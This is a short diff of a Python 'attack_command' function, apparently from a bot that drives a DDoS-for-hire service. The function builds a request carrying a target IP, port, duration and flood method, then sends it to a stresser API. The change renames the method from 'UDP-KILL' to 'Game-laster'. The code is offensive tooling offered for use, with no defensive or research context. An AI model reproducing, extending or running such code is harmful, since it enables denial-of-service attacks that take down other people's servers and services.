@@ -1507,7 +1507,7 @@ def attack_command(message):
             url = url.replace("[target]", ip)\
                      .replace("[port]", str(port))\
                      .replace("[time]", str(duration))\
-                     .replace("[method]", "UDP-KILL")\
+                     .replace("[method]", "Game-laster")\
                      .replace("[key]", key if key else "")
             
             # Fallback for old templates
@@ -1526,7 +1526,7 @@ def attack_command(message):
                 "host": ip,
                 "port": port,
                 "time": duration,
-                "method": "UDP-KILL",
+                "method": "Game-laster",
                 "concurrent": 1
             }
             response = requests.get(url, params=params, timeout=30)
